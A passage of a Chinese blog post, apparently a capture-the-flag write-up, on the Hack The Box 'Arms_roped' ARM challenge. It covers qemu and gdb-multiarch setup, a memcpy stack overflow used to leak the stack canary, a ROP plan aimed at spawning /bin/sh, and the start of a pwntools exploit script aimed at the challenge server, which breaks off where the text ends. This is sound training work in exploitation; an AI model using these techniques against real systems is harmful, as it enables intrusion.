@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="lexsd6" />
+
+
+
+<meta name="description" content="之前一直很想IoT 但是到多数案例，都是arm 结构下的，需要用到qemu来搭建环境。但是arm指令的学习和qemu 使用的各种毛病让我往而却步。不过，幸运的是，我在htb发现这个Arms_roped 这个有利于新手的docker环境（虽然还是有点过时），终于arm学习里踏入的第一步。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从HTB _Arms_roped初识arm架构和qemu">
+<meta property="og:url" content="lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/index.html">
+<meta property="og:site_name" content="lexsd6&#39;s home">
+<meta property="og:description" content="之前一直很想IoT 但是到多数案例，都是arm 结构下的，需要用到qemu来搭建环境。但是arm指令的学习和qemu 使用的各种毛病让我往而却步。不过，幸运的是，我在htb发现这个Arms_roped 这个有利于新手的docker环境（虽然还是有点过时），终于arm学习里踏入的第一步。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/arm-vs-x86.png.pagespeed.ce.i0t9LSiqml.png">
+<meta property="og:image" content="lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/image-20240214235449603.png">
+<meta property="og:image" content="lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/WX20240215-171819@2x.png">
+<meta property="og:image" content="lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/WX20240215-172519@2x.png">
+<meta property="og:image" content="lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/WX20240215-173946@2x.png">
+<meta property="article:published_time" content="2024-02-15T09:47:07.641Z">
+<meta property="article:modified_time" content="2024-02-15T09:48:40.441Z">
+<meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="lexsd6.github.io/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/arm-vs-x86.png.pagespeed.ce.i0t9LSiqml.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/title.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>从HTB _Arms_roped初识arm架构和qemu | lexsd6&#39;s home</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+
+
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/lexsd6.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lexsd6</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DragonBones/" rel="tag">DragonBones</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine/" rel="tag">Machine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/" rel="tag">re</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby/" rel="tag">ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/lexsd6.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap">
+
+
+
+<article id="post-从HTB _Arms_roped初识arm架构" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/" class="article-date">
+      <time datetime="2024-02-15T09:47:07.641Z" itemprop="datePublished">2024-02-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      从HTB _Arms_roped初识arm架构和qemu
+    </h1>
+  
+
+
+          <div style="margin-top:10px 0;margin-bottom:15px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">2k字</span>
+      </span>
+    </span>
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">阅读时长:</span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+</div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a><a class="article-category-link" href="/categories/CTF/HTB/">HTB</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>之前一直很想IoT 但是到多数案例，都是arm 结构下的，需要用到qemu来搭建环境。但是arm指令的学习和qemu 使用的各种毛病让我往而却步。不过，幸运的是，我在htb发现这个Arms_roped 这个有利于新手的docker环境（虽然还是有点过时），终于arm学习里踏入的第一步。<a id="more"></a></p>
+<h2 id="arm环境配置"><a href="#arm环境配置" class="headerlink" title="arm环境配置"></a>arm环境配置</h2><p>​    这个题目很好，给了一个Dockerfile   直接<code>docker build .</code>  就可以搭建一个环境。不过这个环境是一个简单的arm pwn环境。我们只能简单的远程，并不随意打gdb 内存和寄存器的情况，这样对于我们是很不方便。同时，尝试在docker安装gdb插件无果，于是我们便考虑在本地搭一个类似环境用来gdb，再用pwntools来结合。</p>
+<h3 id="qemu安装与使用"><a href="#qemu安装与使用" class="headerlink" title="qemu安装与使用"></a>qemu安装与使用</h3><h4 id="qemu安装"><a href="#qemu安装" class="headerlink" title="qemu安装"></a>qemu安装</h4><p> 安装qemu：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu-user qemu-system qemu-user-static binfmt-support</span><br></pre></td></tr></table></figure>
+
+<p>依赖库安装：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">sudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt git</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就安装好，qemu环境了。</p>
+<p>我们用<code>qemu-arm   -L /usr/arm-linux-gnueabihf/  ./arms_roped</code>   就可以在本地运行了。</p>
+<p>这个步骤也是Dockerfile 记载的方法，不过docker安装是通过在<code>https://github.com/qemu/qemu</code>下载源码来编译的。</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/qemu/qemu /qemu</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /qemu</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> patch.diff .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git checkout e86e00a2493254d072581960b48461eb96481e45</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git apply &lt; patch.diff</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> ./configure  --<span class="built_in">disable</span>-system --<span class="built_in">enable</span>-linux-user --<span class="built_in">disable</span>-bpf --static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> make -j$((`nproc`-1)) qemu-arm</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="qemu的区别与注意"><a href="#qemu的区别与注意" class="headerlink" title="qemu的区别与注意"></a>qemu的区别与注意</h4><p>在刚才的安装中我们其实是安装 三个qemu 启动命令工具： <code>qemu-user</code>、<code>qemu-user-static</code>、<code>qemu-system</code>。</p>
+<p><code>qemu-system</code> 是用于模拟完整计算机系统的命令，qemu 在system mode 上模拟的命令。在system mode  可以模拟多种不同的处理器架构（如x86、ARM、PowerPC等）以及与之相关的外围设备。因此通过 qemu-system，你可以创建一个完整的虚拟机环境，包括模拟的处理器、内存、硬盘、网络接口，这样下整个<strong>文件系统一起模拟</strong>的，我们会得到一个<strong>相对真实</strong>的环境。</p>
+<p><code>qemu-user/qemu-user-static</code> 是用于用户空间应用程序的模拟执行的命令，即以QEMU user mode 允许在一个不同的体系结构上运行二进制可执行文件，而无需模拟整个计算机系统。QEMU user mode是system mode的精简版，只提供TCG层面的支持，他能运行guest Linux上的用户态程序，因此在某些细节还原度上是远远不如system mode  ，比如：libc 段可能无法被正确vmmap 。<code>qemu-user/qemu-user-static</code> 两者的区别是<code>qemu-user-static</code> 是用于静态地模拟执行用户空间应用程序的命令，而``qemu-user`是动态模拟的，在程序开了‘PIE’和‘NX’保护下地址段地址会随机变化。。</p>
+<p>而在本题环境中，dockerfile 给出的是 user mode 的qemu-user来执行命令。</p>
+<p>即：<code>qemu-arm -L /usr/arm-linux-gnueabi ./arms_roped</code></p>
+<p>若我们想gdb  调试 则 用 <code>-g</code> 来开放我们链接的端口。例如：</p>
+<p><code>qemu-arm -g 1234 -L /usr/arm-linux-gnueabi  ./arms_roped</code></p>
+<p>​    </p>
+<h3 id="如何gdb-qemu程序"><a href="#如何gdb-qemu程序" class="headerlink" title="如何gdb qemu程序"></a>如何gdb qemu程序</h3><p>若我们想gdb 我们用qemu 启用的程序，我们还需要通过如下命令安装gdb-multiarch。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure>
+
+<p><code>gdb-multiarch</code> 是 GNU 调试器（GDB）的一个变体，它允许在多种体系结构（如x86、ARM、PowerPC等）上进行调试。通常情况下，<code>gdb</code> 只能调试与宿主系统相同体系结构的程序，但是 <code>gdb-multiarch</code> 可以通过“set architecture  xxx”修改以支持跨体系结构的调试。比如 “set architecture  arm” 修改为arm体系调试。</p>
+<p>关于gdb-multiarch 我们使用如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  ./arms_roped  </span><br><span class="line">set solib-search-path /home/lexs/Desktop/misc/lib</span><br><span class="line">target  remote  127.0.0.1:1234</span><br></pre></td></tr></table></figure>
+
+<p><code>gdb-multiarch  ./arms_roped</code> 打开<code>gdb-multiarch</code>并加载读取<code>arms_roped</code>文件的symbols标识符同时讲调试模式设置为<code>arm</code>。（相当于执行file ./arm_roped 与set architecture  arm” ）</p>
+<p> <code>set solib-search-path</code>将要读取要用到libc文件夹路径设置为我们所设置的文件夹路径。这样gdb中遇到与环境相应的通过链接库，gdb会自动读取相应的symbols标识</p>
+<p><code>target  remote</code>。远程gdb 所暴露的IP和端口。</p>
+<h3 id="如何用pwntools交互"><a href="#如何用pwntools交互" class="headerlink" title="如何用pwntools交互"></a>如何用pwntools交互</h3><p>pwntools模块的process读取所一个命令所产生的进程。我们可以通过下面方式启动，进而发送命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf&#x3D;“.&#x2F;arms_roped”</span><br><span class="line">p &#x3D; process([&quot;qemu-arm-static&quot;, &quot;-L&quot;, &quot;&#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;&quot;, elf])</span><br><span class="line">p &#x3D; process([&quot;qemu-arm-static&quot;,&quot;-g&quot;,&quot;1434&quot; ,&quot;-L&quot;, &quot;&#x2F;usr&#x2F;arm-linux-gnueabihf&#x2F;&quot;, elf])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>遗憾的是对于gdb模块展示不能接受到qemu 暴露的调试端口，只能另起窗口调试。</p>
+<h2 id="arm-汇编入门知识点小提"><a href="#arm-汇编入门知识点小提" class="headerlink" title="arm 汇编入门知识点小提"></a>arm 汇编入门知识点小提</h2><p>x64汇编与arm汇编在一些地方还是神似的地方。比如在寄存器上：</p>
+<p><img src="./arm-vs-x86.png.pagespeed.ce.i0t9LSiqml.png" alt="img"></p>
+<p>eax 在 arm中变成r0，r1-r5对应 edx、ecx，edx，esi，edi。r11（FP）对应edp，edp 对应arm中 r13（SP），而EIP对应R15（PC）。在arm中gadget  以pc来跳转，x64 以ret来跳转。同时，x64中常用的万能gadget也继续存在。</p>
+<p><img src="./image-20240214235449603.png" alt="image-20240214235449603"></p>
+<p>但arm汇编的具体细节又不一样，这里找到一个不错的入门教程说明：</p>
+<p><a href="https://chan-shaw.github.io/2020/03/20/arm%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">https://chan-shaw.github.io/2020/03/20/arm%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>当我们arm环境和知识储备完后，回到这个题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>题目开了 PIE 、NX 和canary 。</p>
+<p>但题目问题点在string_storer函数，我们在用 memcpy 复制时，没有对dest里的值进行清空，也没有对复制的进行长度限制。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">string_storer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">int</span> dest[<span class="number">8</span>]; <span class="comment">// [sp+4h] [bp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">"%m[^\n]%n"</span>, &amp;tmp, &amp;n);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">void</span> *)tmp, n);</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)tmp);</span><br><span class="line">    result = <span class="built_in">memcmp</span>(dest, <span class="string">"quit"</span>, <span class="number">4u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如下下图所示，红色部分就是我们输入，黄色就是canary值，蓝色就是返回地址（elf上一直值）。这导致我们可以泄漏出之前，就留存道dest里elf地址及canary值。</p>
+<p><img src="./WX20240215-171819@2x.png" alt="WX20240215-171819@2x"></p>
+<p>这时，与x86情况类似，我们得到canary 就可以随意利用elf里的gadgets栈溢出了。于此同时，我发现两有意思的gadgets：</p>
+<p><img src="./WX20240215-172519@2x.png" alt=" "></p>
+<p><img src="./WX20240215-173946@2x.png" alt="WX20240215-173946@2x"></p>
+<p>这俩gadgets结合起来就可以泄露出libc地址，来执行execve(“/bin/sh”,0,0)了。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env pythonq</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2024/02/06 23:43:20</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./arms_roped'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/home/lexs/Desktop/misc/lib/libc.so.6')</span></span><br><span class="line">print(e.arch)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">'94.237.62.195'</span>,<span class="number">57984</span>]</span><br><span class="line"><span class="comment">#ip_port=['127.0.0.1',1338]</span></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">print(pwnlib.qemu.user_path(arch=<span class="string">'thumb'</span>))</span><br><span class="line">p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#p = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabihf/", elf])</span></span><br><span class="line"><span class="comment">#p = process(["qemu-arm-static","-g","1434" ,"-L", "/usr/arm-linux-gnueabihf/", elf])</span></span><br><span class="line">p.sendline(<span class="string">'x'</span>*<span class="number">0x21</span>)</span><br><span class="line">p.recvuntil(<span class="string">'x'</span>*<span class="number">0x21</span>)</span><br><span class="line">addr12=p.recv()</span><br><span class="line">canary=u32(addr12[<span class="number">0</span>:<span class="number">3</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))*<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'canary:'</span>+hex(canary))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'x'</span>*(<span 